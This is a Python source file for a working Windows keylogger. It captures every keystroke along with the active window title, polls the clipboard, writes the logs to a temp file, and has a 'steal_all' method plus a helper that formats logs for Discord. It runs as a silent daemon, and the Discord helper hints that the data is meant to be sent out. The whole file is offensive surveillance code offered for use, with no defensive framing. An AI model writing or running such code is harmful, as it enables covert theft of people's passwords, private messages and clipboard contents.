import os
import sys
import time
import json
import base64
import threading
import ctypes
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

try:
    import win32api
    import win32con
    import win32gui
    import win32process
    import win32clipboard
except ImportError:
    pass

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError:
    pass

class Keylogger:
    def __init__(self):
        self.logs = []
        self.current_window = ""
        self.current_keys = []
        self.running = False
        self.listener = None
        self.lock = threading.Lock()
        self.last_clipboard = ""
        self.clipboard_logs = []
        self.key_mapping = {
            Key.space: " ",
            Key.enter: "\n[ENTER]\n",
            Key.tab: "\t[TAB]\t",
            Key.backspace: "[BACKSPACE]",
            Key.delete: "[DELETE]",
            Key.shift: "",
            Key.shift_l: "",
            Key.shift_r: "",
            Key.ctrl: "",
            Key.ctrl_l: "",
            Key.ctrl_r: "",
            Key.alt: "",
            Key.alt_l: "",
            Key.alt_r: "",
            Key.esc: "[ESC]",
            Key.caps_lock: "[CAPS_LOCK]",
            Key.cmd: "",
            Key.cmd_l: "",
            Key.cmd_r: "",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
            Key.home: "[HOME]",
            Key.end: "[END]",
            Key.page_up: "[PAGE_UP]",
            Key.page_down: "[PAGE_DOWN]",
            Key.insert: "[INSERT]",
            Key.f1: "[F1]",
            Key.f2: "[F2]",
            Key.f3: "[F3]",
            Key.f4: "[F4]",
            Key.f5: "[F5]",
            Key.f6: "[F6]",
            Key.f7: "[F7]",
            Key.f8: "[F8]",
            Key.f9: "[F9]",
            Key.f10: "[F10]",
            Key.f11: "[F11]",
            Key.f12: "[F12]",
            Key.num_lock: "[NUM_LOCK]",
            Key.scroll_lock: "[SCROLL_LOCK]",
            Key.print_screen: "[PRINT_SCREEN]",
            Key.pause: "[PAUSE]",
            Key.menu: "[MENU]"
        }
        
    def get_active_window(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(hwnd)
            
            # Get process name
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process_name = ""
            
            try:
                import psutil
                process = psutil.Process(pid)
                process_name = process.name()
            except:
                pass
            
            return {
                "title": window_title,
                "process": process_name,
                "pid": pid,
                "hwnd": hwnd
            }
        except:
            return {
                "title": "",
                "process": "",
                "pid": 0,
                "hwnd": 0
            }
    
    def on_press(self, key):
        try:
            with self.lock:
                window_info = self.get_active_window()
                window_title = window_info.get("title", "")
                
                # Check if window changed
                if window_title != self.current_window:
                    self.current_window = window_title
                    self.current_keys.append(f"\n\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] - [{window_title}]\n")
                
                # Handle special keys
                if key in self.key_mapping:
                    mapped = self.key_mapping[key]
                    if mapped:
                        self.current_keys.append(mapped)
                else:
                    # Handle regular characters
                    try:
                        char = key.char
                        if char:
                            self.current_keys.append(char)
                    except AttributeError:
                        pass
                
                # Auto-log every 100 keys
                if len(self.current_keys) >= 100:
                    self.flush_logs()
        except:
            pass
    
    def on_release(self, key):
        pass
    
    def flush_logs(self):
        try:
            with self.lock:
                if self.current_keys:
                    log_entry = {
                        "timestamp": datetime.now().isoformat(),
                        "window": self.current_window,
                        "content": ''.join(self.current_keys)
                    }
                    
                    self.logs.append(log_entry)
                    self.current_keys = []
        except:
            pass
    
    def start(self):
        if self.running:
            return
        
        self.running = True
        
        try:
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.daemon = True
            self.listener.start()
        except:
            pass
    
    def stop(self):
        self.running = False
        
        try:
            if self.listener:
                self.listener.stop()
        except:
            pass
        
        self.flush_logs()
    
    def get_logs(self):
        self.flush_logs()
        return self.logs
    
    def clear_logs(self):
        with self.lock:
            self.logs = []
            self.current_keys = []
            self.clipboard_logs = []
    
    def capture_clipboard(self, interval_seconds=10):
        while self.running:
            try:
                win32clipboard.OpenClipboard()
                
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                    clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                    
                    if isinstance(clipboard_data, bytes):
                        clipboard_text = clipboard_data.decode('utf-8', errors='ignore')
                    else:
                        clipboard_text = str(clipboard_data)
                    
                    if clipboard_text != self.last_clipboard:
                        self.last_clipboard = clipboard_text
                        self.clipboard_logs.append({
                            "timestamp": datetime.now().isoformat(),
                            "content": clipboard_text
                        })
                
                win32clipboard.CloseClipboard()
            except:
                pass
            
            time.sleep(interval_seconds)
    
    def start_clipboard_capture(self, interval_seconds=10):
        clipboard_thread = threading.Thread(
            target=self.capture_clipboard,
            args=(interval_seconds,),
            daemon=True
        )
        clipboard_thread.start()
    
    def format_logs_for_discord(self, logs, limit=1000):
        formatted = []
        
        for log in logs[:limit]:
            formatted.append({
                "timestamp": log.get("timestamp", ""),
                "window": log.get("window", ""),
                "content": log.get("content", "")
            })
        
        return formatted
    
    def export_logs_to_file(self, output_path=None):
        if output_path is None:
            output_path = os.path.join(os.getenv("TEMP"), f"keylogs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                for log in self.logs:
                    f.write(f"[{log.get('timestamp', '')}] [{log.get('window', '')}]\n")
                    f.write(log.get('content', ''))
                    f.write("\n" + "=" * 50 + "\n")
                
                if self.clipboard_logs:
                    f.write("\n\n[CLIPBOARD LOGS]\n")
                    f.write("=" * 50 + "\n")
                    
                    for clipboard_log in self.clipboard_logs:
                        f.write(f"[{clipboard_log.get('timestamp', '')}]\n")
                        f.write(clipboard_log.get('content', ''))
                        f.write("\n" + "-" * 30 + "\n")
            
            return output_path
        except:
            return None
    
    def get_statistics(self):
        total_chars = sum(len(log.get('content', '')) for log in self.logs)
        total_windows = len(set(log.get('window', '') for log in self.logs))
        
        return {
            "total_logs": len(self.logs),
            "total_characters": total_chars,
            "total_windows": total_windows,
            "total_clipboard_logs": len(self.clipboard_logs)
        }
    
    def steal_all(self):
        logs = self.get_logs()
        
        return {
            "keylogs": logs,
            "clipboard_logs": self.clipboard_logs,
            "statistics": self.get_statistics()
        }

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
    keylogger.start_clipboard_capture()
    
    print("Keylogger started. Press Ctrl+C to stop...")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        keylogger.stop()
        
        data = keylogger.steal_all()
        print(f"Total logs: {data['statistics']['total_logs']}")
        print(f"Total characters: {data['statistics']['total_characters']}")
        print(json.dumps(data['keylogs'][:5], indent=2))